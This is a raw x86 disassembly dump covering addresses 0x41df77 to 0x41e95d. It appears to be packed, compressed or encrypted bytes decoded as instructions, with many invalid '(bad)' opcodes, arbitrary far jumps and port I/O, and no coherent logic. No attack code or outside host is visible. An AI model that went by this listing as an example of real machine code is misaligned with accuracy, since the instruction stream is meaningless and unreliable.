  41df77:	cld    
  41df78:	push   ds
  41df79:	std    
  41df7a:	jmp    edi
  41df7c:	dec    edi
  41df7d:	push   0x118a9ce9
  41df82:	pop    eax
  41df83:	push   0xfffffff3
  41df85:	add    DWORD PTR ds:[eax],eax
  41df88:	add    eax,0x3d000001
  41df8d:	mov    cl,0x7
  41df8f:	xlat   BYTE PTR ds:[ebx]
  41df90:	(bad)  
  41df91:	and    bl,BYTE PTR [esi-0x75]
  41df94:	sub    eax,0x52de34fd
  41df99:	xchg   ebx,eax
  41df9a:	call   0x3b07ff30
  41df9f:	pop    ecx
  41dfa0:	mov    DWORD PTR [ebx-0x7ab3f9b],edx
  41dfa6:	mov    dl,ah
  41dfa8:	aaa    
  41dfa9:	test   DWORD PTR [ebx+0x24212ecb],edx
  41dfaf:	cmp    eax,0xb3c97caf
  41dfb4:	pop    ebp
  41dfb5:	mov    ds:0x85007954,eax
  41dfba:	xor    BYTE PTR [edi-0x80],dl
  41dfbd:	jg     0x41e034
  41dfbf:	sub    eax,0x98c2cae
  41dfc4:	gs fdiv st(5),st
  41dfc7:	je     0x41df6d
  41dfc9:	test   ebx,esp
  41dfcb:	call   0x971c:0x86ce9439
  41dfd2:	sub    BYTE PTR [eax+0x55],al
  41dfd5:	cli    
  41dfd6:	push   edx
  41dfd7:	mov    esi,0x54902c3c
  41dfdc:	sbb    eax,0x11399192
  41dfe1:	adc    al,0x36
  41dfe3:	std    
  41dfe4:	fisub  DWORD PTR [eax+0x65d8bc39]
  41dfea:	lock jbe 0x41e053
  41dfed:	cdq    
  41dfee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfef:	clc    
  41dff0:	je     0x41df98
  41dff2:	fcomp  QWORD PTR [ebx]
  41dff4:	mov    esi,0x933cb3cd
  41dff9:	push   cs
  41dffa:	shl    DWORD PTR [edi+0x7b],1
  41dffd:	xlat   BYTE PTR ds:[ebx]
  41dffe:	mov    ch,0xc8
  41e000:	sub    DWORD PTR [ecx+0x1356f652],esp
  41e006:	out    0xf2,eax
  41e008:	push   eax
  41e009:	sub    al,0x8c
  41e00b:	sti    
  41e00c:	mov    eax,0xc7f9971a
  41e011:	mov    cl,0x87
  41e013:	sub    al,BYTE PTR [ebx+esi*2-0x66]
  41e017:	cdq    
  41e018:	ins    DWORD PTR es:[edi],dx
  41e019:	pop    ebp
  41e01a:	test   BYTE PTR ds:0xe50564ca,ah
  41e020:	aad    0x63
  41e022:	mov    ecx,0x53606383
  41e027:	push   es
  41e028:	mov    BYTE PTR [eax+0x42],dl
  41e02b:	jno    0x41dfee
  41e02d:	or     dl,dh
  41e02f:	jmp    0x41e05c
  41e031:	inc    eax
  41e032:	xor    esp,edx
  41e034:	sub    eax,0x992eb493
  41e039:	repnz lds edx,FWORD PTR [esi+0x10]
  41e03d:	mov    ebp,0xea7d9f20
  41e042:	mov    al,ds:0x15c3b36c
  41e047:	aam    0x24
  41e049:	pusha  
  41e04a:	scas   eax,DWORD PTR es:[edi]
  41e04b:	mov    esp,0xca69187e
  41e050:	ds push cs
  41e052:	dec    ebp
  41e053:	nop
  41e054:	dec    edx
  41e055:	push   es
  41e056:	xchg   DWORD PTR [edx+0x647f5817],edx
  41e05c:	aaa    
  41e05d:	jnp    0x41e033
  41e05f:	pop    esp
  41e060:	add    BYTE PTR [edi+ebp*4],0x5
  41e064:	lahf   
  41e065:	jns    0x41e0b7
  41e067:	lea    ebx,[esi+0x7fcc7ff3]
  41e06d:	fsub   st,st(6)
  41e06f:	fs retf 0xfa2d
  41e073:	sbb    al,0xb4
  41e075:	hlt    
  41e076:	into   
  41e077:	scas   eax,DWORD PTR es:[edi]
  41e078:	jns    0x41dfff
  41e07a:	and    ebx,DWORD PTR [edx+0x39aab098]
  41e080:	imul   eax
  41e082:	and    al,0x1f
  41e084:	sbb    bh,al
  41e086:	pop    esp
  41e087:	stos   DWORD PTR es:[edi],eax
  41e088:	(bad)  [esi+edi*4+0x52]
  41e08c:	or     BYTE PTR [edi],al
  41e08e:	retf   0xf1a4
	...
  41e0f1:	add    BYTE PTR [eax],al
  41e0f3:	add    BYTE PTR [edi+0x53],cl
  41e0f6:	add    al,0xc
  41e0f8:	sbb    al,0x5f
  41e0fa:	dec    edi
  41e0fb:	push   ebx
  41e0fc:	out    0x6d,eax
  41e0fe:	aad    0x48
  41e100:	ins    BYTE PTR es:[edi],dx
  41e101:	retf   0xb05e
  41e104:	clc    
  41e105:	aas    
  41e106:	add    DWORD PTR [eax],eax
  41e108:	add    eax,0xa6000001
  41e10d:	mov    ds:0xcdebd220,al
  41e112:	push   ss
  41e113:	jns    0x41e129
  41e115:	jns    0x41e143
  41e117:	and    BYTE PTR [edx+eax*8],0x86
  41e11b:	ret    0x3619
  41e11e:	adc    DWORD PTR [edi-0x47],0xffffffde
  41e122:	(bad)  
  41e124:	push   0xffffff8b
  41e126:	xlat   BYTE PTR ds:[ebx]
  41e127:	fwait
  41e128:	lock push 0x30
  41e12b:	sar    DWORD PTR [ecx+0x36],1
  41e12e:	or     eax,0x141bf4c
  41e133:	cmp    BYTE PTR [ebp-0x7d],0xce
  41e137:	mov    al,ds:0x6f5f0925
  41e13c:	es in  eax,dx
  41e13e:	repnz loopne 0x41e141
  41e141:	je     0x41e138
  41e143:	xor    BYTE PTR [ebx-0x33],dl
  41e146:	test   BYTE PTR [esi+edx*1-0x4b2b8938],dl
  41e14d:	push   cs
  41e14e:	ret    0xc237
  41e151:	mov    BYTE PTR [esi],al
  41e153:	add    BYTE PTR [eax],bh
  41e155:	mov    al,0xf0
  41e157:	int3   
  41e158:	mov    ds:0x81835ad1,al
  41e15d:	pop    esp
  41e15e:	push   ds
  41e15f:	sbb    edi,DWORD PTR [edx]
  41e161:	mov    BYTE PTR [edi-0x36],dl
  41e164:	add    dh,ch
  41e166:	pushf  
  41e167:	shr    eax,cl
  41e169:	fsub   DWORD PTR [esi-0x33]
  41e16c:	pop    ebp
  41e16d:	dec    BYTE PTR [esi-0x4919d4d4]
  41e173:	ret    
  41e174:	push   esp
  41e175:	scas   eax,DWORD PTR es:[edi]
  41e176:	mov    bh,0xa7
  41e178:	lds    edx,FWORD PTR [ebx+0x61]
  41e17b:	test   al,0xb1
  41e17d:	fdivr  QWORD PTR [edi-0x6fd54158]
  41e183:	fst    QWORD PTR [edi+0x41]
  41e186:	jns    0x41e156
  41e188:	sub    DWORD PTR [ecx+0x17],ebx
  41e18b:	xchg   DWORD PTR [eax],esi
  41e18d:	mov    eax,ds:0x6981436a
  41e192:	sbb    ch,BYTE PTR [edx]
  41e194:	and    BYTE PTR [edx-0x43],cl
  41e197:	add    DWORD PTR [ecx],ebp
  41e199:	dec    eax
  41e19a:	mov    BYTE PTR [ebp*4+0x2a9a062a],al
  41e1a1:	sbb    DWORD PTR [eax+0x66a561a7],0xef661c01
  41e1ab:	ret    0xb512
  41e1ae:	(bad)  
  41e1af:	mov    bh,0xf5
  41e1b1:	jbe    0x41e16c
  41e1b3:	lds    ebp,FWORD PTR [edx]
  41e1b5:	mov    ah,0xbe
  41e1b7:	sar    bh,0xf8
  41e1ba:	(bad)  
  41e1bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e1bd:	adc    DWORD PTR [ebx],0x532f20c2
  41e1c3:	push   0xffffffa3
  41e1c5:	sub    al,0xf4
  41e1c7:	fdiv   DWORD PTR [ecx]
  41e1c9:	sub    eax,0x7e4d390a
  41e1ce:	mov    ah,0x66
  41e1d0:	mov    cl,0xb5
  41e1d2:	pop    edi
  41e1d3:	inc    ecx
  41e1d4:	repz push esp
  41e1d6:	push   ss
  41e1d7:	dec    ebp
  41e1d8:	imul   esp,ecx,0xae4ca46a
  41e1de:	lods   al,BYTE PTR ds:[esi]
  41e1df:	(bad)  
  41e1e0:	mov    esi,0x1968c4b2
  41e1e5:	push   ebx
  41e1e6:	sbb    bl,BYTE PTR [edx-0x57]
  41e1e9:	cmp    al,BYTE PTR [esi-0x3]
  41e1ec:	mov    bh,0x70
  41e1ee:	nop
  41e1ef:	mov    edx,0xedd058cd
  41e1f4:	pop    edi
  41e1f5:	in     al,dx
  41e1f6:	add    ch,BYTE PTR [ebp-0x481772ec]
  41e1fc:	adc    BYTE PTR [esi-0x26536fc6],cl
  41e202:	push   cs
  41e203:	cmp    DWORD PTR [esi],edx
  41e205:	lods   al,BYTE PTR ds:[esi]
  41e206:	push   esp
  41e207:	outs   dx,DWORD PTR ds:[esi]
  41e208:	scas   eax,DWORD PTR es:[edi]
  41e209:	cmp    eax,0xeb83036e
  41e20e:	adc    ah,cl
  41e210:	call   0x41e215
	...
  41e271:	add    BYTE PTR [eax],al
  41e273:	add    BYTE PTR [ebx-0x1988fe],ch
  41e279:	idiv   DWORD PTR [ebx+0x6f64c34f]
  41e27f:	or     al,0x74
  41e281:	or     al,0x2c
  41e283:	pop    ebx
  41e284:	std    
  41e285:	inc    eax
  41e286:	add    DWORD PTR [eax],eax
  41e288:	add    eax,0x47000001
  41e28d:	dec    edi
  41e28e:	xchg   ecx,eax
  41e28f:	jb     0x41e2fd
  41e291:	dec    dl
  41e293:	lods   al,BYTE PTR ds:[esi]
  41e294:	test   dl,cl
  41e296:	sbb    cl,al
  41e298:	pop    esp
  41e299:	mov    BYTE PTR [esi+0x0],cl
  41e29c:	popa   
  41e29d:	sub    al,0x53
  41e29f:	mov    ch,0x50
  41e2a1:	test   eax,0x1f49a94a
  41e2a6:	cld    
  41e2a7:	es inc ebx
  41e2a9:	push   ecx
  41e2aa:	xchg   ebp,eax
  41e2ab:	cdq    
  41e2ac:	mov    al,0x2b
  41e2ae:	stos   DWORD PTR es:[edi],eax
  41e2af:	pop    edi
  41e2b0:	push   esp
  41e2b1:	sub    eax,DWORD PTR [eax*1+0x42218193]
  41e2b8:	iret   
  41e2b9:	jno    0x41e251
  41e2bb:	sub    ecx,esi
  41e2bd:	pop    ds
  41e2be:	sub    eax,0xf67330a8
  41e2c3:	shl    BYTE PTR [edi-0x2f],1
  41e2c6:	inc    ecx
  41e2c7:	add    eax,DWORD PTR [ebx]
  41e2c9:	and    DWORD PTR [esi+0x6c7866a4],eax
  41e2cf:	push   ebx
  41e2d0:	pusha  
  41e2d1:	cmc    
  41e2d2:	and    al,0x34
  41e2d4:	jp     0x41e344
  41e2d6:	push   esi
  41e2d7:	and    al,0x73
  41e2d9:	xchg   esi,eax
  41e2da:	inc    ebx
  41e2db:	xadd   DWORD PTR [esi-0x682d0672],esp
  41e2e2:	pusha  
  41e2e3:	add    al,0x43
  41e2e5:	adc    eax,0xc8a09439
  41e2ea:	pop    ecx
  41e2eb:	ret    
  41e2ec:	push   ebp
  41e2ed:	in     al,dx
  41e2ee:	(bad)  
  41e2ef:	mov    WORD PTR [edi],ds
  41e2f1:	jo     0x41e2bb
  41e2f3:	xor    al,0x88
  41e2f5:	aaa    
  41e2f6:	ss or  al,0x24
  41e2f9:	cmp    DWORD PTR [edx-0x4a],esp
  41e2fc:	ins    BYTE PTR es:[edi],dx
  41e2fd:	dec    ecx
  41e2fe:	outs   dx,BYTE PTR ds:[esi]
  41e2ff:	fwait
  41e300:	jo     0x41e36a
  41e302:	mov    cl,0xeb
  41e304:	push   es
  41e305:	(bad)  
  41e307:	jbe    0x41e324
  41e309:	cld    
  41e30a:	gs ds (bad) 
  41e30e:	or     eax,0x27a389db
  41e313:	push   edi
  41e314:	js     0x41e30d
  41e316:	aam    0xbd
  41e318:	mul    DWORD PTR [ebx-0x67]
  41e31b:	fwait
  41e31c:	bound  edx,QWORD PTR [ecx+ebp*2-0x6870299b]
  41e323:	cmp    DWORD PTR [esi+eiz*8+0x5bc795b5],ecx
  41e32a:	xor    eax,0xc5653463
  41e32f:	or     eax,0xc291c297
  41e334:	mov    eax,ds:0x8969508b
  41e339:	and    BYTE PTR [ebx-0x433a9e14],0xc1
  41e340:	and    bh,BYTE PTR [esi]
  41e342:	call   DWORD PTR [esi+0x7f]
  41e345:	push   ebp
  41e346:	jg     0x41e370
  41e348:	mov    eax,ds:0x1f868317
  41e34d:	int    0x61
  41e34f:	jo     0x41e357
  41e351:	hlt    
  41e352:	popa   
  41e353:	test   al,0xde
  41e355:	and    esp,eax
  41e357:	lods   eax,DWORD PTR ds:[esi]
  41e358:	pop    ebp
  41e359:	cmp    al,BYTE PTR [ebx+0xfe781f2]
  41e35f:	adc    ecx,DWORD PTR [ebx]
  41e361:	push   eax
  41e362:	out    dx,eax
  41e363:	mov    al,0x7d
  41e365:	cs pushf 
  41e367:	mov    ecx,0x1300dcc6
  41e36c:	into   
  41e36d:	loope  0x41e302
  41e36f:	std    
  41e370:	xor    BYTE PTR [edx-0x4d],ah
  41e373:	shl    DWORD PTR [esi+0x6c],cl
  41e376:	lahf   
  41e377:	jg     0x41e3d4
  41e379:	jmp    0xfe92a264
  41e37e:	jmp    0xaa5d:0x8df362d0
  41e385:	das    
  41e386:	ja     0x41e355
  41e388:	or     ebx,DWORD PTR [edi]
  41e38a:	(bad)
  41e38f:	jno    0x41e368
	...
  41e3f1:	add    BYTE PTR [eax],al
  41e3f3:	add    BYTE PTR [ecx-0xe088ee],cl
  41e3f9:	jg     0x41e3e4
  41e3fb:	xchg   esi,eax
  41e3fc:	or     DWORD PTR [edx+0x18],0x339a2e09
  41e403:	popa   
  41e404:	add    al,BYTE PTR [edx+0x1]
  41e407:	add    BYTE PTR ds:0x45000001,al
  41e40d:	jmp    0x41e44c
  41e40f:	sti    
  41e410:	sbb    BYTE PTR [edi+0x7088de8d],bl
  41e416:	xchg   BYTE PTR [ebx+0x46],dh
  41e419:	and    ecx,DWORD PTR [ecx+0x56]
  41e41c:	inc    esi
  41e41d:	retf   
  41e41e:	pop    ebp
  41e41f:	or     al,0x84
  41e421:	fwait
  41e422:	mov    ds:0x9138a594,eax
  41e427:	cs and cl,dh
  41e42a:	nop
  41e42b:	inc    edi
  41e42c:	nop
  41e42d:	call   0x5eb:0x4f8ffe3f
  41e434:	fadd   st,st(3)
  41e436:	fisttp WORD PTR [edx+0x9ac2a45]
  41e43c:	dec    esp
  41e43d:	stos   BYTE PTR es:[edi],al
  41e43e:	(bad)  [edi+0x619ac673]
  41e444:	push   esi
  41e445:	mov    edi,DWORD PTR [edi-0x1d]
  41e448:	(bad)  
  41e44a:	mov    WORD PTR [eax],es
  41e44c:	in     eax,dx
  41e44d:	(bad)  
  41e44e:	xchg   edx,eax
  41e44f:	sbb    esi,ebx
  41e451:	mov    ds:0x58de0bd5,al
  41e456:	and    al,0x87
  41e458:	xor    al,0xb9
  41e45a:	push   0x6c
  41e45c:	ror    DWORD PTR [ebx+0x2],0x11
  41e460:	addr16 pop ds
  41e462:	sbb    eax,0xa1901088
  41e467:	adc    ah,cl
  41e469:	cli    
  41e46a:	sbb    eax,0x49ef965d
  41e46f:	jb     0x41e473
  41e471:	retf   
  41e472:	into   
  41e473:	fidiv  DWORD PTR ds:0x8d6d62b
  41e479:	xor    edi,DWORD PTR [ebp+0x32b98a6d]
  41e47f:	cvtps2pd xmm3,QWORD PTR [ebp-0x428f3103]
  41e486:	cmp    esi,ecx
  41e488:	dec    edi
  41e489:	mov    edx,0xa7a09d1c
  41e48e:	xor    DWORD PTR [edx],0xffffffd1
  41e491:	xor    BYTE PTR [ebx-0x31729417],0x93
  41e498:	in     al,0x83
  41e49a:	das    
  41e49b:	fiadd  DWORD PTR [ebp+edi*8+0xd3e0b95]
  41e4a2:	mov    bl,0x15
  41e4a4:	bound  esi,QWORD PTR [esi+0x5f4b0517]
  41e4aa:	divps  xmm4,xmm4
  41e4ad:	mov    esi,0x4c747df1
  41e4b2:	push   esp
  41e4b3:	les    esp,FWORD PTR [esi-0x45fd06e]
  41e4b9:	jbe    0x41e501
  41e4bb:	pop    ds
  41e4bc:	out    0xc7,al
  41e4be:	lods   eax,DWORD PTR ds:[esi]
  41e4bf:	jbe    0x41e529
  41e4c1:	test   eax,0x7a393402
  41e4c6:	push   es
  41e4c7:	out    0x39,al
  41e4c9:	mov    dh,0xea
  41e4cb:	out    0xc5,eax
  41e4cd:	int    0xf
  41e4cf:	out    dx,eax
  41e4d0:	rcr    DWORD PTR [edx+0x72bc250a],0xa1
  41e4d7:	mov    ecx,0x8e94ae92
  41e4dc:	pop    es
  41e4dd:	mov    al,0x95
  41e4df:	push   ss
  41e4e0:	in     al,0xd4
  41e4e2:	aam    0xb0
  41e4e4:	fild   QWORD PTR [edx]
  41e4e6:	faddp  st(1),st
  41e4e8:	scas   al,BYTE PTR es:[edi]
  41e4e9:	xchg   BYTE PTR [ebx-0x6d0b788a],ah
  41e4ef:	arpl   WORD PTR [esi-0x33db8fc7],si
  41e4f5:	je     0x41e565
  41e4f7:	mov    dl,0xa9
  41e4f9:	jg     0x41e49a
  41e4fb:	sti    
  41e4fc:	xor    DWORD PTR [ebx+esi*1+0x4b],eax
  41e500:	out    dx,al
  41e501:	jb     0x41e576
  41e503:	add    edx,DWORD PTR [ebx]
  41e505:	dec    edi
  41e506:	gs push 0xeb55e507
  41e50c:	test   eax,0x41f3881e
	...
  41e571:	add    BYTE PTR [eax],al
  41e573:	add    BYTE PTR [eax],ah
  41e575:	push   0xffffffcb
  41e577:	dec    ebx
  41e578:	retf   
  41e579:	jmp    0x41e51b
  41e57b:	imul   ebp,ebx,0xffffffb1
  41e57e:	aaa    
  41e57f:	je     0x41e54b
  41e581:	sbb    bh,BYTE PTR [ebp+0x143078c]
  41e587:	add    BYTE PTR ds:0xbf000001,al
  41e58d:	retf   
  41e58e:	les    eax,FWORD PTR [esi+0x29fd066e]
  41e594:	mov    bh,dl
  41e596:	dec    ecx
  41e597:	mov    al,ds:0x72917539
  41e59c:	jmp    0x41e611
  41e59e:	gs jle 0x41e5a6
  41e5a1:	or     esp,DWORD PTR cs:[ecx]
  41e5a4:	loope  0x41e5e4
  41e5a6:	clc    
  41e5a7:	adc    DWORD PTR [ebx+0x49],esi
  41e5aa:	jl     0x41e5c7
  41e5ac:	cmp    dl,BYTE PTR [esi+0x3c]
  41e5af:	pop    ebp
  41e5b0:	js     0x41e55b
  41e5b2:	and    bl,bl
  41e5b4:	mov    al,0x12
  41e5b6:	fstp   DWORD PTR [ecx]
  41e5b8:	pop    esi
  41e5b9:	ins    DWORD PTR es:[edi],dx
  41e5ba:	jns    0x41e575
  41e5bc:	sbb    ch,BYTE PTR [edx+0x2fc7d13a]
  41e5c2:	icebp  
  41e5c3:	jne    0x41e629
  41e5c5:	(bad)  
  41e5c6:	mov    ecx,0xb78776ea
  41e5cb:	mov    DWORD PTR [edx+0x6d],ebx
  41e5ce:	sbb    eax,0x4b028bca
  41e5d3:	mov    al,0xef
  41e5d5:	call   0x95551e21
  41e5da:	mov    edx,0xcdc26b5c
  41e5df:	dec    ebx
  41e5e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e5e1:	mov    bh,0xf8
  41e5e3:	pop    eax
  41e5e4:	xor    al,0x20
  41e5e6:	inc    esp
  41e5e7:	popf   
  41e5e8:	aas    
  41e5e9:	ins    DWORD PTR es:[edi],dx
  41e5ea:	iret   
  41e5eb:	and    bl,cl
  41e5ed:	dec    esi
  41e5ee:	adc    al,0x1b
  41e5f0:	out    dx,al
  41e5f1:	mov    gs,WORD PTR [esi-0x46791630]
  41e5f7:	push   ds
  41e5f8:	inc    esp
  41e5f9:	hlt    
  41e5fa:	movlps xmm0,QWORD PTR [ecx]
  41e5fd:	test   al,0x24
  41e5ff:	xchg   ch,ch
  41e601:	outs   dx,BYTE PTR ds:[esi]
  41e602:	adc    ch,dh
  41e604:	jb     0x41e5c5
  41e606:	adc    bl,BYTE PTR [ebx+0x39571564]
  41e60c:	out    0x3f,eax
  41e60e:	mov    ebx,0x56823e9b
  41e613:	jo     0x41e600
  41e615:	push   ebx
  41e616:	mov    eax,ds:0xafe0ccb8
  41e61b:	inc    ebp
  41e61c:	hlt    
  41e61d:	jle    0x41e693
  41e61f:	rol    DWORD PTR [edi+0x629c8ff8],cl
  41e625:	mov    DWORD PTR [edx+0x5f94630a],edx
  41e62b:	dec    esp
  41e62c:	jb     0x41e647
  41e62e:	fs aaa 
  41e630:	sub    edi,DWORD PTR [esi+0x18]
  41e633:	xor    ebp,DWORD PTR [eax+0x42]
  41e636:	pop    ecx
  41e637:	mov    al,ds:0x3dad1d6f
  41e63c:	push   cs
  41e63d:	(bad)  
  41e63e:	lods   eax,DWORD PTR ds:[esi]
  41e63f:	daa    
  41e640:	adc    ebx,DWORD PTR [esi+0x16fa8836]
  41e646:	in     al,dx
  41e647:	xlat   BYTE PTR ds:[ebx]
  41e648:	jmp    0x8434:0x344aac6c
  41e64f:	loopne 0x41e648
  41e651:	xlat   BYTE PTR ds:[ebx]
  41e652:	mul    BYTE PTR [ebx+0x55654206]
  41e658:	test   BYTE PTR ds:0x5e55dd26,bl
  41e65e:	fsubr  st(1),st
  41e660:	inc    eax
  41e661:	jne    0x41e624
  41e663:	jp     0x41e6ce
  41e665:	cmp    ebp,DWORD PTR [edi+esi*4]
  41e668:	cld    
  41e669:	adc    BYTE PTR [edi-0x75],ah
  41e66c:	mov    ch,0xd
  41e66e:	in     al,0xe1
  41e670:	imul   edx,DWORD PTR [edi-0x72],0xaff8c094
  41e677:	rcr    BYTE PTR [ebp-0x35],0xdb
  41e67b:	jecxz  0x41e6f3
  41e67d:	mov    bl,0xbf
  41e67f:	xchg   ebx,eax
  41e680:	popf   
  41e681:	call   0x394b:0x1fc07b91
  41e688:	mov    eax,ds:0x4cdd1cfe
  41e68d:	gs push edx
  41e68f:	adc    esp,edi
	...
  41e6f1:	add    BYTE PTR [eax],al
  41e6f3:	add    ch,al
  41e6f5:	cwde   
  41e6f6:	loope  0x41e74d
  41e6f8:	std    
  41e6f9:	jge    0x41e6f0
  41e6fb:	cwde   
  41e6fc:	xchg   esp,eax
  41e6fd:	push   0x37
  41e6ff:	sub    ecx,DWORD PTR [edx+0xc85f359]
  41e705:	inc    esp
  41e706:	add    DWORD PTR [eax],eax
  41e708:	add    eax,0xa2000001
  41e70d:	push   ebp
  41e70e:	cli    
  41e70f:	add    eax,ebx
  41e711:	adc    ch,BYTE PTR [edi+0x266cb000]
  41e717:	jg     0x41e6e0
  41e719:	(bad)  
  41e71b:	les    eax,FWORD PTR [ebp+0x79d00ceb]
  41e721:	xchg   DWORD PTR [ebx+0x5887bca6],edx
  41e727:	dec    edi
  41e728:	jae    0x41e76c
  41e72a:	lock and DWORD PTR [ebx+ecx*1-0x3154d786],ecx
  41e732:	(bad)  
  41e733:	dec    edi
  41e734:	mov    esi,0x3283ff0a
  41e739:	js     0x41e761
  41e73b:	in     al,0xc3
  41e73d:	pop    edi
  41e73e:	and    dl,al
  41e740:	idiv   BYTE PTR [ebp-0x1db66d7a]
  41e746:	rcl    bh,cl
  41e748:	mov    esi,DWORD PTR [edi+0x4e1c0beb]
  41e74e:	es sub al,0x9d
  41e751:	outs   dx,DWORD PTR ds:[esi]
  41e752:	cmp    dl,al
  41e754:	add    bl,dh
  41e756:	ret    
  41e757:	dec    eax
  41e758:	dec    esi
  41e759:	mov    ebp,esi
  41e75b:	adc    eax,0x933b85bd
  41e760:	xchg   edi,eax
  41e761:	mov    ?,WORD PTR [edi+0x1b5e2931]
  41e767:	call   0xce57:0xf464d990
  41e76e:	pop    ecx
  41e76f:	stos   DWORD PTR es:[edi],eax
  41e770:	int    0xa1
  41e772:	adc    DWORD PTR [ebx+0x65],esi
  41e775:	ins    DWORD PTR es:[edi],dx
  41e776:	dec    esp
  41e777:	or     edi,ecx
  41e779:	cmp    BYTE PTR [edx-0x50],bh
  41e77c:	clc    
  41e77d:	add    cl,ch
  41e77f:	pop    ecx
  41e780:	lods   al,BYTE PTR ds:[esi]
  41e781:	ficomp WORD PTR [ebx+ebp*1]
  41e784:	mov    ebp,es
  41e786:	(bad)  
  41e787:	fst    st(7)
  41e789:	sub    al,0xb
  41e78b:	dec    edi
  41e78c:	sub    bh,BYTE PTR [esi+0x1c]
  41e78f:	pop    ebx
  41e790:	ret    
  41e791:	loope  0x41e7e6
  41e793:	mov    dl,0x4e
  41e795:	pop    ss
  41e796:	mov    edi,0x25c1909b
  41e79b:	mov    ds:0xd700b25d,al
  41e7a0:	mov    eax,0xc01f3b13
  41e7a5:	cld    
  41e7a6:	retf   
  41e7a7:	fcomip st,st(5)
  41e7a9:	not    edx
  41e7ab:	jns    0x41e79c
  41e7ad:	mov    eax,ds:0x6b0698fe
  41e7b2:	sub    eax,DWORD PTR [eax]
  41e7b4:	mov    ecx,fs
  41e7b6:	mov    esi,0x4862af0b
  41e7bb:	jp     0x41e7ba
  41e7bd:	jmp    0xf3aedd92
  41e7c2:	mov    ch,BYTE PTR [ebx+eiz*4+0x1b]
  41e7c6:	sbb    DWORD PTR [ebp-0x4e],0x56
  41e7ca:	aad    0x9
  41e7cc:	mov    esp,0x7348b7a5
  41e7d1:	int    0xae
  41e7d3:	cmp    al,0x59
  41e7d5:	mov    edi,0xde0236a
  41e7da:	pop    ds
  41e7db:	mov    ch,0xb6
  41e7dd:	in     eax,0x1f
  41e7df:	loope  0x41e853
  41e7e1:	jl     0x41e7c5
  41e7e3:	push   edx
  41e7e4:	push   ecx
  41e7e5:	add    al,0x2a
  41e7e7:	leave  
  41e7e8:	inc    ebp
  41e7e9:	sub    edx,DWORD PTR [edx-0x60]
  41e7ec:	pop    ds
  41e7ed:	cmp    BYTE PTR [edx-0x5928f7c4],bh
  41e7f3:	push   esi
  41e7f4:	and    eax,0x6fb57d90
  41e7f9:	xlat   BYTE PTR ds:[ebx]
  41e7fa:	mov    bh,0xcf
  41e7fc:	inc    edi
  41e7fd:	sbb    BYTE PTR [esi-0x14],dh
  41e800:	xor    ebx,DWORD PTR [ecx+0x7cbee9ae]
  41e806:	add    BYTE PTR fs:[eax],dl
  41e809:	mov    eax,ds:0x574623bc
  41e80e:	test   eax,esi
  41e810:	mov    ds:0x0,al
	...
  41e871:	add    BYTE PTR [eax],al
  41e873:	add    BYTE PTR ds:0x9e5c8a39,ch
  41e879:	(bad)  
  41e87a:	(bad)  
  41e87b:	jns    0x41e8ec
  41e87d:	xor    al,0xcc
  41e87f:	jg     0x41e8c7
  41e881:	xchg   esi,eax
  41e882:	dec    ebx
  41e883:	xchg   DWORD PTR [ecx],edx
  41e885:	inc    ebp
  41e886:	add    DWORD PTR [eax],eax
  41e888:	add    eax,0xc2000001
  41e88d:	cmc    
  41e88e:	cmp    al,0xd6
  41e890:	aaa    
  41e891:	add    cl,dh
  41e893:	xor    DWORD PTR [ecx-0x17648cff],esi
  41e899:	outs   dx,DWORD PTR ds:[esi]
  41e89a:	(bad)  
  41e89b:	loopne 0x41e8da
  41e89d:	jbe    0x41e848
  41e89f:	arpl   di,bx
  41e8a1:	outs   dx,BYTE PTR ds:[esi]
  41e8a2:	jo     0x41e8ff
  41e8a4:	fwait
  41e8a5:	repz hlt 
  41e8a7:	test   DWORD PTR [eax],ebp
  41e8a9:	arpl   WORD PTR [edx+0x28c3a67c],cx
  41e8af:	loop   0x41e904
  41e8b1:	push   cs
  41e8b2:	leave  
  41e8b3:	nop
  41e8b4:	or     DWORD PTR [ecx+ebx*4],esi
  41e8b7:	push   cs
  41e8b8:	ins    BYTE PTR es:[edi],dx
  41e8b9:	loop   0x41e912
  41e8bb:	ds daa 
  41e8bd:	je     0x41e892
  41e8bf:	pop    eax
  41e8c0:	mov    esp,0x4d6ee1ac
  41e8c5:	xchg   ecx,eax
  41e8c6:	les    edi,FWORD PTR [ecx]
  41e8c8:	ret    0xe81a
  41e8cb:	stos   DWORD PTR es:[edi],eax
  41e8cc:	je     0x41e8eb
  41e8ce:	addr16 jnp 0x41e88c
  41e8d1:	sbb    DWORD PTR [eax],ebp
  41e8d3:	scas   eax,DWORD PTR es:[edi]
  41e8d4:	bswap  ecx
  41e8d6:	mov    BYTE PTR [esp+esi*1-0x353b90d2],dl
  41e8dd:	sub    DWORD PTR [edx+0x3e3f5629],ecx
  41e8e3:	test   BYTE PTR [ecx+0x2f],dh
  41e8e6:	mov    esi,0xabad2b9a
  41e8eb:	daa    
  41e8ec:	mov    ebx,0x1c879a7b
  41e8f1:	loop   0x41e959
  41e8f3:	popf   
  41e8f4:	add    BYTE PTR ds:0x4483430d,bl
  41e8fa:	hlt    
  41e8fb:	xor    ecx,esp
  41e8fd:	xor    dl,bl
  41e8ff:	imul   BYTE PTR [ebp-0x3b67971d]
  41e905:	scas   al,BYTE PTR es:[edi]
  41e906:	stos   BYTE PTR es:[edi],al
  41e907:	cmc    
  41e908:	mov    WORD PTR [esi],ds
  41e90a:	mov    bl,0xbb
  41e90c:	xchg   ebp,eax
  41e90d:	ror    DWORD PTR ds:0x48233d,1
  41e913:	fs mov esi,0x839201
  41e919:	push   ss
  41e91a:	fprem1 
  41e91c:	jmp    0xe6826808
  41e921:	ret    0x3d1e
  41e924:	out    0xd6,al
  41e926:	or     eax,0x7c8d8655
  41e92b:	dec    ebx
  41e92c:	cmp    eax,0xd8cc9fa5
  41e931:	xchg   esi,eax
  41e932:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e933:	push   edi
  41e934:	pop    esp
  41e935:	addr16 in al,dx
  41e937:	(bad)
  41e93b:	pop    es
  41e93c:	stos   DWORD PTR es:[edi],eax
  41e93d:	xor    eax,0xac1a1950
  41e942:	cmp    BYTE PTR [eax-0x5f],ah
  41e945:	test   eax,0xbfeffb08
  41e94a:	jle    0x41e905
  41e94c:	test   BYTE PTR [edi],ah
  41e94e:	cdq    
  41e94f:	imul   eax,DWORD PTR [esi+ecx*4-0x53],0x1114cf9f
  41e957:	xor    esp,DWORD PTR [edx-0x25905ff8]
  41e95d:	sub    ecx,DWORD PTR [edi]
